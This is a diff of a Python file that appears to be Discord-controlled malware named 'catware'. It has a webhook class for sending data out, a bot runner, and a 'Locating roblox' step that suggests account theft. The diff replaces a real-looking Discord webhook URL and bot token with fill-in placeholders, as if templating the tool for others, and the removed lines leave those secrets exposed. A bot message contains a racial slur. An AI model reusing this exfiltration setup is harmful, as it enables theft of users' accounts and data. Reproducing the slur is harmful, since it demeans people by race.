@@ -31,7 +31,7 @@ import codecs
 embedcolor = 000000
 class Hook:
     def GetHOOK():
-        webhook = "https://discord.com/api/webhooks/927875786004914219/cnyq_EjQtc6N-ILZIdcqiSCq0arMcRTKURxCBc3fw4QaunD-z3S9ATz0kIUmhpWT-eO-"
+        webhook = "UR WEB HOOK"
         return webhook
 
     def SendHOOK(data):
@@ -789,7 +789,7 @@ def Startbot():
             startembed.add_field(name = '\nok', value =  "powered by nigger joss <:munapea:927651098532139008>"  ,inline= False)
             await message.channel.send(embed = startembed) 
         await catware.process_commands(message)
-    catware.run("OTI3MjM5NzAxMTMwMjQ4Mjcy.YdHVRA.h4kEQJlptQUW7V5JxPrXb_KGEcE")
+    catware.run("UR BOT TOKEN")
 
 def start():
     print('Locating roblox')
